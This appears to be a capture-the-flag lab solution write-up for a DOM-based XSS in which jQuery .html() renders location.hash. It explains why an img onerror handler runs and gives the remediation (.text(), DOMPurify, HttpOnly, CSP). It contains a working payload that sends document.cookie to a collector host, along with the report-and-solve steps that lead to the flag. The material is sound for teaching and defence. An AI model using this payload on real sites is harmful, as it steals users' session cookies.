# Solution — DOM XSS via jQuery .html() on location.hash

## The sink

```js
function render() {
  $('#panel').html(decodeURIComponent(location.hash.slice(1) || 'home'));
}
$(window).on('hashchange', render);
$(render); // also on load
```

- **Source:** `location.hash` (client-side, attacker-controlled).
- **Sink:** jQuery `.html()` → `innerHTML`.

DOM-based XSS (CWE-79, OWASP A03:2021 – Injection). No server round-trip, so
server-side encoding cannot help.

## Why `<img onerror>` and not `<script>`

Setting `innerHTML` (which is what `.html()` does) does **not** execute a bare
`<script>` element — the HTML spec says scripts inserted via innerHTML don't run.
But an element with an inline event handler runs as soon as it is parsed:

```html
<img src="x" onerror="…" />
<!-- src=x 404s → onerror fires -->
<svg onload="…"></svg>
<!-- also works -->
```

## The payload

Put this in the fragment (URL-encoded), and submit the path to `POST /report`:

```html
<img
  src="x"
  onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
/>
```

Chain:

```
POST /report      {"url":"/#<url-encoded payload>"}
# admin bot loads /#… → $('#panel').html(...) parses the <img> → onerror fires →
# new Image() beacons document.cookie to the collector
GET  /oob/received       # find /report?c=session%3D<32hex>
POST /solve       {"c":"<32hex>"}     →  FLAG{…}
```

`tests/exploit.py` automates this.

## Why the containment holds

- The collector is on a `backend` network with `internal: true` — no route off
  the host; the stolen cookie reaches the in-lab collector, never the internet.
- `/internal/bot-login` (mints the admin cookie) and `/internal/queue` are
  backend-only, so a public visitor cannot obtain the admin session without the
  DOM XSS. `risk: low`.

## The fix

Use `.text()` for untrusted routing input — it sets `textContent`, so markup
becomes inert literal text:

```js
$('#panel').text(decodeURIComponent(location.hash.slice(1) || 'home'));
```

If HTML really is required, run the input through a sanitiser (DOMPurify) first,
and set an `HttpOnly` session cookie so a successful injection still cannot read
it. A strict CSP (`script-src` without `'unsafe-inline'`) would also block the
`onerror` handler.

> **jQuery version:** this lab uses jQuery **3.7.1** (current). The flaw is the
> app's `.html(untrusted)` call, not any jQuery CVE — it reproduces identically
> on every version. Shipping a current, non-vulnerable jQuery keeps the exploit
> path unambiguous and the CI Trivy library gate honest.
